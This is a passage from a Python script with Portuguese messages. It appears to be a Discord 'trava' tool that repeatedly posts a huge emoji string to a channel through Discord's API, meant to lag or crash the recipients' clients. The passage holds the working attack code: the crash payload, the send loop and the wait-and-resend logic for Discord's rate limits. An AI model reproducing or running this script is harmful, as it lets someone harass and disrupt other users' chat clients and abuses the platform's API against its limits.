                    payload3 = {'content':'**🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉🌇🌌🎑🌁🌆🌉**',
                    'nonce': f'7707895532{n1}{n6}{n5}{n4}{n3}3{n}{n2}',
                    'tts': 'false'}

                    r = requests.post(f'https://discord.com/api/v8/channels/{uID}/messages', headers=headers, json=payload3)
                    if r.status_code == 200:
                        print('Trava Enviada Com Sucesso!!')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui 7 segundos!!')
                        time.sleep(7)
                    else:
                        print(f'Houve Um Erro CRITÍCO! | {r.status_code} | {r.text}')
                        input('\n     Pressione ENTER Para Fechar!!')
                        exit()
                except Exception as errorWarn:
                    print('Houve Um Erro CRITÍCO! | {}'.format(errorWarn))
                    input('\n     Pressione ENTER Para Fechar!!')
                    exit()
            time.sleep(0.5)
            os.system('color')
            time.sleep(0.5)

        else:
           os.system("color 4")
           print('\n\n       DIGITE APENAS 1, 2 OU 3!')
           input('\n      Pressione ENTER Para Fechar!!')
           exit() 
    else:
        os.system("color 4")
        print('\n\n       DIGITE APENAS 1 OU 2!')
        input('\n     Pressione ENTER Para Fechar!!')
        exit()
except KeyboardInterrupt:
    os.system('cls')
    print(logo)
    print('                                    Até Mais!! ^^')
    time.sleep(2.5)
    exit()